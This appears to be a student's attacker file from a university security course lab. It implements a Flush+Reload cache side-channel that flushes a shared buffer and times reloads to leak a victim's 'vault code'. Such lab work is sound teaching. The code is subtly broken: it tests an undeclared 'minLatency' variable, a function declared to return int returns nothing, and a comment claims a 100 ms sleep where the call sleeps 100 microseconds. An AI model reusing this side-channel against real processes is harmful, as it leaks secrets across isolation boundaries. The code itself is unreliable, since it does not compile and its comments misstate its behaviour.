/**
 * 
 * CMU 15-793 Security for Secure Computer Systems Spring 2024
 * 
 *  thief.c is the attacker implementation. You need to add the code for 
 *  flush_reload().
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

#define SHARED_ID "CHANNEL"

const CYCLES hit_threshhold = 150;

//flush entire buffer
void flushBuf(int size, uint8_t *buf) {
	for (int i = 0; i < size; i+=64) {
		clflush((uint64_t)buf + i);
	}
	//sleep for 100ms to allow victim address to be cached
	usleep(100);
}

//flush buffer and time accesses to each 
int flush_reload(int size, uint8_t *buf) {

	flushBuf(size, buf);

	int key_code = 0;
	CYCLES min_latency = 10000;

	//time accesses to each address
	for (int i = 0; i < size; i+=64) {
		CYCLES cycles = measure_line_access_time((uint64_t)buf + i);
		
		/* if (cycles < hit_threshhold) { */
		/* 	printf("Key: %d, %d\n", i, cycles); */
		/* } */
		/* flushBuf(size, buf); */
		if (minLatency > cycles) {
			key_code = i;
			min_latency = cycles;
		}
	}

    printf("Vault code: %d (%d)\n", key_code, min_latency);

}

int main(int argc, char const *argv[]) {
    int fd;
    fd = shm_open(SHARED_ID, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
    if (fd == -1){
	printf("shm_open error\n");
	exit(1);
    }

    int buf_size = 4096 * 512;
    uint8_t *buf;
    if ((buf = (uint8_t *)mmap(
           NULL, buf_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED) {
        printf("mmap error\n");
        exit(1);
    }
    
    // you may need to add repetitions  
    flush_reload(buf_size, buf);
 }
